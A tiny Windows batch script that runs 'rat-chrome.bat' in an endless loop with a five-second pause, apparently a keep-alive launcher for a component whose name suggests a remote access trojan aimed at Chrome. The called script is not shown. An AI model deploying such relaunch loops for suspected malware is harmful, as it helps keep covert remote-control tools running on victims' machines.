@echo off
:loop
call rat-chrome.bat
timeout /nobreak 5 > nul
goto :loop
